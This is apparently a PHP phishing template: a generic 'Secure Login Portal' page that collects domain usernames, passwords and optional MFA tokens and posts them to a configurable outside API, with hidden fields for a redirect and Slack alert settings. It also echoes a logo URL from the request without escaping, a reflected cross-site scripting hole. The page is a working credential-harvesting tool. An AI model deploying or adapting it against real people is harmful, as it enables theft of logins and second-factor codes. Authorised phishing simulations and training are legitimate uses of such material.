<html>
  <head>
<title><?php if($Title != ""){echo $Title;}else{echo "Secure Login Portal";} ?></title>
  <style>
  body#LoginForm{ background-image:url("blur-26347-27038-hd-wallpapers.jpg"); background-repeat:no-repeat; background-position:center; background-size:cover; padding:10px;}

.form-heading { color:#fff; font-size:23px;}
.panel h2{ color:#444444; font-size:18px; margin:0 0 8px 0;}
.panel p { color:#777777; font-size:14px; margin-bottom:30px; line-height:24px;}
.login-form .form-control {
  background: #f7f7f7 none repeat scroll 0 0;
  border: 1px solid #d4d4d4;
  border-radius: 4px;
  font-size: 14px;
  height: 50px;
  line-height: 50px;
}
.main-div {
  background: #ffffff none repeat scroll 0 0;
  border-radius: 2px;
  margin: 10px auto 30px;
  max-width: 38%;
  padding: 50px 70px 70px 71px;
}

.login-form .form-group {
  margin-bottom:10px;
}
.login-form{ text-align:center;}
.forgot a {
  color: #777777;
  font-size: 14px;
  text-decoration: underline;
}
.login-form  .btn.btn-primary {
  background: #f0ad4e none repeat scroll 0 0;
  border-color: #f0ad4e;
  color: #ffffff;
  font-size: 14px;
  width: 100%;
  height: 50px;
  line-height: 50px;
  padding: 0;
}
.forgot {
  text-align: left; margin-bottom:30px;
}
.botto-text {
  color: #ffffff;
  font-size: 14px;
  margin: auto;
}
.login-form .btn.btn-primary.reset {
  background: #ff9900 none repeat scroll 0 0;
}
.back { text-align: left; margin-top:10px;}
.back a {color: #444444; font-size: 13px;text-decoration: none;}

  </style>
  
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->
  </head>
<body id="LoginForm">
<BR><BR>
<div class="container">
<div class="login-form">
<div class="main-div">
    <div class="panel">
<?php if(isset($_REQUEST['ImageLogo']) && $_REQUEST['ImageLogo'] != ""){echo "<IMG SRC='".$_REQUEST['ImageLogo']."' WIDTH='200'><BR><BR>";}?>
<?php if($Title != ""){echo "<h2>".$Title."</h2>";}else{echo "<h2>Secure Login Portal</h2>";} ?>
   <p>Please enter your email and password</p>
   </div>
    <form id="Login" action="<?php echo $APIURL; ?>" method="POST">

        <div class="form-group">


            <input type="email" class="form-control" id="inputEmail" placeholder="DOMAIN\Username" name="username">

        </div>

        <div class="form-group">

            <input type="password" class="form-control" id="inputPassword" placeholder="Password" name="password">

        </div>
		
		        <input type="hidden" name="project" value="<?php echo $Project; ?>">
                <input type="hidden" name="redirect" value="<?php echo $Redirect; ?>">
                <input type="hidden" name="slackbotname" value="<?php echo $SlackBotName; ?>">
                <input type="hidden" name="slackemoji" value="<?php echo $SlackEmoji; ?>">	
		
	<?php if($MFA == "on"){ ?>
	
		        <div class="form-group">

            <input type="text" class="form-control" placeholder="Token" name="token" <?php if($MFArequired == "on"){ ?>required<?php } ?>>

        </div>

	<?php } ?>
		
        <CENTER><div class="forgot">
        <a href="reset.html">Forgot password?</a>
</div></CENTER>
        <button type="submit" class="btn btn-primary">Login</button>

    </form>
    </div>
</div></div></div>


</body>
</html>
